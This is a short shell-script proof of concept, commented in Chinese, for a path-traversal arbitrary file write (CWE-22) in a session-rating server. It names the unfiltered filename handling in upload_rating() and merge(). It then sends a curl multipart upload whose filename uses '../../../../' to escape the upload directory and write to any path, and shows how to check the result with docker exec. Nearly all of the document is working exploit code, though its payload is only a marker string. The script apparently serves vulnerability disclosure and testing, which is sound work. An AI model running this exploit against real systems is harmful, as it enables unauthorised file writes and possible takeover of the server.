#!/bin/sh
# skillhub session-rating-server 路径遍历任意文件写入 PoC (CWE-22)
#
# 漏洞位置: /app/server.py
#   upload_rating(): tar_filename = file.filename  → store_dir / tar_filename → open(..., "wb")
#   merge():         filename = body.get("filename") → store_dir / filename → open(..., "wb")
# 均未过滤 "../"，导致任意文件写入。

TARGET="${1:-http://127.0.0.1:7800}"
OUT_FILE="${2:-/tmp/skillhub_path_traversal.txt}"

echo "PATH_TRAVERSAL_POC_MARKER" > /tmp/poc_payload.txt

# filename 携带 ../../../../ 逃逸上传目录，写到容器内任意路径
curl -s -X POST "$TARGET/api/v1/session_rating" \
  -F 'metadata={"user_id":"poc","session_id":"poc","rating":"5"}' \
  -F "file=@/tmp/poc_payload.txt;filename=../../../../$OUT_FILE"

echo ""
echo "[+] 若写入成功，目标容器内 $OUT_FILE 应存在且内容为 PATH_TRAVERSAL_POC_MARKER"
echo "    验证: docker exec session-rating-server cat $OUT_FILE"
